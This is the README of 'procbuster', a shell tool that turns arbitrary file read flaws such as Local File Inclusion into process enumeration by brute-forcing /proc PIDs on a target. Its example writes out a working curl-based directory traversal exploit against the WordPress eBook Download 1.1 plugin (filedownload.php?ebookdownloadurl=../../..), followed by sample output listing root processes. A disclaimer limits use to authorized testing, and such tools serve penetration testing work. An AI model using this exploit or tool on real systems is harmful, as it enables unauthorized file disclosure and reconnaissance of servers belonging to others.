# procbuster

`procbuster` is a shell-based system process enumerator that exploits arbitrary file read vulnerabilities (e.g. Local File Inclusion) to **brute-force the `/proc` directory** on a target machine. It reads each process’s `status` and `cmdline` files to list running processes — without shell access. The output mimics `ps`, making it easy to identify system activity and active services during exploitation.

---
### :warning: DISCLAIMER  
This project is intended **for educational, research, and authorized security testing purposes only**.  
**Do not use this code on systems you do not own or have explicit permission to test.**  
The author is **not responsible** for any damage or misuse.

---
### Usage

```
┌──(magicrc㉿perun)-[~/code/procbuster]
└─$ ./procbuster.sh -h                                   
Lists processes by brute-forcing /proc PIDs and reading status and cmdline.

Usage: ./procbuster.sh [--file-read-cmd CMD] [--max-pid MAX_PID] [--help]

Options:
  --file-read-cmd CMD    Command used to read files, e.g. curl piped with sed stored in dedicated script / binary (default: cat)
  --max-pid MAX_PID      Maximum PID to check (default: 65535)
  -h, --help             Show this help message
```

### Example
Using Wordpress eBook Download 1.1 Directory Traversal vulnerability
```
┌──(magicrc㉿perun)-[~/code/procbuster]
└─$ { cat <<'EOF'> exploit.sh
#!/bin/bash

curl -s -o - "http://target/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../..$1" \
    | sed "s|\(../../../../../..${1}\)\+||g" \
    | sed 's#<script>window\.close()</script>$##'
EOF
} && chmod +x exploit.sh && \
./procbuster.sh --file-read-cmd ./exploit.sh --max-pid 20
PID     USER                 CMD
1       root                 /sbin/init auto automatic-ubiquity noprompt 
2       root                 [kthreadd]
3       root                 [rcu_gp]
4       root                 [rcu_par_gp]
6       root                 [kworker/0:0H-kblockd]
7       root                 [kworker/0:1-events]
9       root                 [mm_percpu_wq]
10      root                 [ksoftirqd/0]
11      root                 [rcu_sched]
12      root                 [migration/0]
13      root                 [idle_inject/0]
14      root                 [cpuhp/0]
15      root                 [cpuhp/1]
16      root                 [idle_inject/1]
17      root                 [migration/1]
18      root                 [ksoftirqd/1]
20      root                 [kworker/1:0H-kblockd]
```